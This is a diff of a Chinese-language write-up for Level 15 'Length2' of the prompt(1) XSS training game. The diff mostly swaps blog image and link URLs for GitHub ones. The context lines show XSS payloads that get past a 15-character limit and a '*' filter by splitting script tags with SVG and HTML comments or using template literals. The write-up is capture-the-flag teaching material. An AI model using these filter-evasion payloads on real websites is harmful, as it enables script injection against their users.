@@ -20,7 +20,7 @@ function escape(input) {
 
 ## 解题报告
 
-这题与 【[Level 7 - Length](http://exp-blog.com/2019/03/23/pid-3672/)】 十分相似，区别在于：
+这题与 【[Level 7 - Length](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2007%20-%20Length)】 十分相似，区别在于：
 
 - 长度限制从 12 放宽到 15
 - `*` 被过滤，导致 JS 注释 `/* */` 不可用
@@ -52,7 +52,7 @@ function escape(input) {
 </svg>
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/0d6a2a75a2e7b51f80b3b6adee29c7f8.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/01.png)
 
 
 ------------
@@ -66,11 +66,11 @@ function escape(input) {
 <p class="comment" title="-->(1)</script>" data-comment='{"id":3}'></p>
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/4f8d368c7fa59b6def781ffce7eaf004.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/02.png)
 
 从而可以反推出这题的 payload 为（*注意此处去掉了前面测试时的全部空格，那些空格只是为了便于对齐观察注入点，没有什么作用，保留或删除均可*）： `"><svg><!--#--><script><!--#-->prompt<!--#-->(1)</script>`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/be7f2e9ef45152c1eef67e3d2789b7ab.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/03.png)
 
 
 ------------
@@ -87,7 +87,7 @@ function escape(input) {
 </script>
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/5dd76a1ce224f2046397070315a7f58d.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/04.png)
 
 回到这题，我们只需要最终构造成这样的代码即可：
 
@@ -97,7 +97,7 @@ function escape(input) {
 <p class="comment" title="`</script>     " data-comment='{"id":2}'></p>
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/ac02f695860a194a23b9168ff79700b2.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/05.png)
 
 从而可以反推出这题的 payload 为（*注意此处去掉了前面测试时的全部空格，那些空格只是为了便于对齐观察注入点，没有什么作用，保留或删除均可*）： 
 
@@ -105,9 +105,9 @@ function escape(input) {
 "><script>`#${prompt(1)}#`</script>
 ```
 
-> 注：这个 payload 也可用于 【[Level 7 - Length](http://exp-blog.com/2019/03/23/pid-3672/)】 。
+> 注：这个 payload 也可用于 【[Level 7 - Length](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2007%20-%20Length)】 。
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/14fce6739e727fd9ef0b0cbcf3527ec9.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/06.png)
 
 ------
 
